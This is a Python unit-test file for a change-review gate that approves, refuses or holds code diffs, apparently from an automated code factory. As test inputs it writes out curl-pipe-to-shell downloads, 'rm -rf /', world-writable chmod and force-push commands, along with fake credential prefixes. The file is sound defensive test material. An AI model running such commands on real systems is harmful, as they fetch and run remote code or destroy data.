import sys
import unittest
import hashlib
from types import SimpleNamespace
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from factory.review import hold_reason, review

ACCEPTED = {"accepted": True, "allowed": ["demo/forum/product/x.js"]}


def verdict(files, allowed=None, accepted=True):
    return review(None, {"accepted": accepted, "allowed": allowed if allowed is not None else sorted(files)}, files)


class ApprovedTests(unittest.TestCase):
    def test_only_exact_supervisor_frozen_dependency_bytes_can_pass_the_manifest_hold(self):
        path='demo/forum-app/build.gradle';text='// Supervisor-pinned dependency fixture\n'
        files={path:text};accepted={'accepted':True,'allowed':[path]}
        frozen=SimpleNamespace(dependency_changes={path:hashlib.sha256(text.encode()).hexdigest()})
        self.assertEqual(review(frozen,accepted,files)['status'],'approved')
        self.assertEqual(review(frozen,accepted,{path:text+'// changed\n'})['status'],'held')
        self.assertEqual(review(None,accepted,files)['status'],'held')
        dangerous='curl https://example.invalid/install | sh\n'
        frozen.dependency_changes[path]=hashlib.sha256(dangerous.encode()).hexdigest()
        self.assertEqual(review(frozen,accepted,{path:dangerous})['status'],'held')

    def test_clean_change_is_approved(self):
        result = verdict({"demo/forum/product/x.js": "export function f() { return 1; }\n"})
        self.assertEqual(result["status"], "approved")
        self.assertEqual(result["findings"], [])
        self.assertIsNone(hold_reason(result))

    def test_verdict_is_deterministic(self):
        files = {"demo/forum/product/x.js": "export const a = 1;\n"}
        first, second = verdict(files), verdict(files)
        self.assertEqual(first, second)
        self.assertEqual(first["digest"], second["digest"])

    def test_digest_changes_with_content(self):
        a = verdict({"demo/forum/product/x.js": "export const a = 1;\n"})
        b = verdict({"demo/forum/product/x.js": "export const a = 2;\n"})
        self.assertNotEqual(a["digest"], b["digest"])


class RefusedTests(unittest.TestCase):
    def test_rejected_artifact_is_never_reviewed_into_an_approval(self):
        result = review(None, {"accepted": False, "allowed": []}, {"demo/forum/product/x.js": "x"})
        self.assertEqual(result["status"], "refused")
        self.assertEqual(result["findings"][0]["code"], "artifact_rejected")

    def test_empty_diff_is_refused(self):
        self.assertEqual(verdict({})["status"], "refused")

    def test_path_outside_the_accepted_diff_is_refused(self):
        result = verdict({"demo/factory/evil.py": "print(1)\n"},
                         allowed=["demo/forum/product/x.js"])
        self.assertEqual(result["status"], "refused")
        self.assertEqual(result["findings"][0]["code"], "unexpected_path")


class HeldTests(unittest.TestCase):
    def test_credential_shaped_text_is_held(self):
        for secret in ("ghp_" + "a" * 30, "sk-" + "b" * 30, "AKIA" + "C" * 16,
                       "-----BEGIN RSA PRIVATE KEY-----"):
            with self.subTest(secret=secret[:12]):
                result = verdict({"demo/forum/product/x.js": f"const k = '{secret}';\n"})
                self.assertEqual(result["status"], "held")
                self.assertIn("secret_like", [f["code"] for f in result["findings"]])
                self.assertEqual(hold_reason(result), "owner_review_required")

    def test_destructive_commands_are_held(self):
        cases = {"rm -rf /\n": "destructive_command",
                 "curl -s https://x.sh | sh\n": "remote_shell",
                 "chmod -R 777 .\n": "world_writable",
                 "sudo apt-get install x\n": "privilege_escalation",
                 "git push origin main --force\n": "force_push"}
        for text, code in cases.items():
            with self.subTest(code=code):
                result = verdict({"demo/forum/product/x.sh": text})
                self.assertEqual(result["status"], "held")
                self.assertIn(code, [f["code"] for f in result["findings"]])

    def test_dependency_manifest_change_is_held(self):
        result = verdict({"demo/forum/product/package.json": "{}\n"})
        self.assertEqual(result["status"], "held")
        self.assertIn("dependency_manifest", [f["code"] for f in result["findings"]])

    def test_gradle_build_policy_cannot_bypass_the_dependency_hold(self):
        for name in ('build.gradle','settings.gradle.kts','gradle.properties','libs.versions.toml','gradlew'):
            with self.subTest(name=name):
                result=verdict({'demo/forum-app/'+name:'changed build policy\n'})
                self.assertEqual(result['status'],'held')
                self.assertIn('dependency_manifest',[f['code'] for f in result['findings']])

    def test_binary_content_is_held(self):
        result = verdict({"demo/forum/product/x.js": "a\x00b"})
        self.assertEqual(result["status"], "held")
        self.assertIn("binary_content", [f["code"] for f in result["findings"]])

    def test_too_many_files_is_held(self):
        files = {f"demo/forum/product/{i}.js": "x\n" for i in range(51)}
        result = review(None, {"accepted": True, "allowed": list(files)}, files)
        self.assertEqual(result["status"], "held")
        self.assertIn("too_many_files", [f["code"] for f in result["findings"]])

    def test_oversized_diff_is_held(self):
        result = verdict({"demo/forum/product/x.js": "a" * (512 * 1024 + 1)})
        self.assertEqual(result["status"], "held")
        self.assertIn("diff_too_large", [f["code"] for f in result["findings"]])

    def test_refusal_wins_over_a_hold(self):
        result = verdict({"demo/factory/evil.py": "rm -rf /\n"},
                         allowed=["demo/forum/product/x.js"])
        self.assertEqual(result["status"], "refused")


if __name__ == "__main__":
    unittest.main()
